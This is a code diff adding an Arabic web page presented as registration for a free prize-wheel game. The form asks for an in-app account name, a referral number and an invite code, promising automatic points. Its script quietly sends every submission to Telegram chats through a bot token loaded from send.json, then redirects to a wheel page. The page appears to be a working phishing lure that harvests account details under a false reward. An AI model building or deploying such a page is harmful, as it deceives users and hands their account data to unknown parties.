@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الصفحة الرئيسية للعبة العجلة</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: white;
+            padding: 10px;
+        }
+
+        h1 {
+            margin-top: 20px;
+            font-size: 2em;
+            color: #333;
+            animation: colorChange 3s linear infinite;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        @keyframes colorChange {
+            0% {
+                color: #ff4b5c;
+            }
+
+            25% {
+                color: #6a8d92;
+            }
+
+            50% {
+                color: #ff8c00;
+            }
+
+            75% {
+                color: #32a852;
+            }
+
+            100% {
+                color: #ff4b5c;
+            }
+        }
+
+        input {
+            padding: 10px;
+            font-size: 20px;
+            margin: 10px;
+            border: 4px solid #066b63;
+            border-radius: 5px;
+            width: 80%;
+            max-width: 400px;
+            box-sizing: border-box;
+            display: inline-block;
+            text-decoration: none;
+            text-align: center;
+        }
+
+        button,
+        a.button {
+            padding: 10px;
+            font-size: 20px;
+            margin: 10px;
+            border: 2px solid #066b63;
+            border-radius: 50px;
+            width: 80%;
+            max-width: 400px;
+            box-sizing: border-box;
+            display: inline-block;
+            text-decoration: none;
+            text-align: center;
+        }
+
+        button:hover,
+        a.button:hover {
+            background: red;
+        }
+
+        #note h2 {
+            font-size: 1.2em;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>طلب معلوماتك داخل تطبيق للتسجيل في لعبة المجانية</h1>
+
+    <!-- نموذج إدخال البيانات -->
+    <form id="infoForm">
+        <input type="text" id="name" placeholder="اسم حساب داخل التطبيق" required><br>
+        <input type="number" id="referral" placeholder="رمز الإحالة" required min="1" max="99999999"><br>
+        <input type="text" id="code" placeholder="كود الدعوة" required pattern="^[A-Za-z0-9]{1,8}$" title="كود الدعوة يجب أن يحتوي على 1 إلى 8 أحرف أو أرقام"><br>
+
+        <button type="submit">متابعة الى اللعبة</button>
+    </form>
+
+    <!-- زر يحتوي على رابط -->
+    <a href="https://t.me/Dinars6" class="button">قناة الرسمية للعبة</a>
+
+    <!-- ملاحظة أسفل الزر -->
+    <div id="note">
+        <h2>يرجى ادخال بياناتك داخل تطبيق بشكل صحيح للحصول على نقاط تلقائي</h2>
+                <h2>لا تقم بتكرار التدوير اكثر من مرة لانه يتم حظرك 8 ايام.</h2>
+        <h2>عزيزي المستخدم لديك صلاحية فرصة واحدة كل 24 ساعة.</h2>
+
+    </div>
+
+    <script>
+        // حدث عند إرسال النموذج
+        document.getElementById('infoForm').addEventListener('submit', function (event) {
+            event.preventDefault(); // منع إرسال النموذج بالطريقة التقليدية
+
+            // الحصول على البيانات من المدخلات
+            const name = document.getElementById('name').value;
+            const code = document.getElementById('code').value;
+            const referral = document.getElementById('referral').value;
+
+            // إرسال البيانات إلى البوت
+            sendToTelegramBot(name, code, referral);
+
+            // الانتقال إلى صفحة العجلة بعد إرسال البيانات
+            window.location.href = 'wheel.html?name=' + encodeURIComponent(name) + '&code=' + encodeURIComponent(code) + '&referral=' + encodeURIComponent(referral);
+        });
+
+        // دالة لإرسال البيانات إلى البوت
+        function sendToTelegramBot(name, code, referral) {
+            fetch('send.json')
+                .then(response => response.json())
+                .then(config => {
+                    const botToken = config.botToken;
+                    const chatIds = config.chatIds;
+
+                    chatIds.forEach(chatId => {
+                        const messageText = `اسم المستخدم: ${name}\nالكود: ${code}\nرمز الإحالة: ${referral}`;
+                        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
+
+                        fetch(url)
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('تم إرسال البيانات إلى البوت بنجاح:', data);
+                            })
+                            .catch(error => {
+                                console.error('حدث خطأ أثناء إرسال البيانات إلى البوت:', error);
+                            });
+                    });
+                })
+                .catch(error => {
+                    console.error('حدث خطأ أثناء تحميل البيانات من ملف send.json:', error);
+                });
+        }
+    </script>
+
+</body>
+
+</html>
